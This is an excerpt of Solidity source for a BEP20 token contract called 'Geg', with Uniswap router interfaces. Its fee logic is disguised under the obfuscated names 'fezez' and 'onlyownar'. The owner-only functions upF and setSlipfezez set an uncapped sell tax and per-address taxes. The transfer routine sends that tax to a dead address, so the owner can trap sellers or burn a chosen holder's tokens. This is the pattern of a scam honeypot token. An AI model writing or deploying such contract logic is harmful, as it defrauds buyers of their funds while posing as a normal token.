...
interface IUniswapV2Factory {
    ...
    function fezezTo() external view returns (address);
    function fezezToSetter() external view returns (address);
    ...
    function setfezezTo(address) external;
    function setfezezToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfezezOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfezezOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfezezOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfezezOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfezezOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract Geg is BEP20, Ownable {
    ...
    uint256 private _defaultSellfezez = 0;

    uint256 private _defaultBuyfezez = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfezez;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfezez = _value;
    }

    function setSlipfezez(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfezez[_address] = _value;
    }

    function getSlipfezez(address _address) external view onlyownar returns (uint256) {
        return _slipfezez[_address];
    }


    function setMAccountfezez(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfezez(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefezezAmount = 0;

        if (rF) {
            uint256 tradefezez = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefezez = _defaultSellfezez;
                }
                if (from == uniswapV2Pair) {

                    tradefezez = _defaultBuyfezez;
                }
            }
            if (_slipfezez[from] > 0) {
                tradefezez = _slipfezez[from];
            }

            tradefezezAmount = _Amount.mul(tradefezez).div(100);
        }


        if (tradefezezAmount > 0) {
            _balances[from] = _balances[from].sub(tradefezezAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefezezAmount);
            emit Transfer(from, _deadAddress, tradefezezAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefezezAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefezezAmount);
        emit Transfer(from, _to, _Amount - tradefezezAmount);
    }
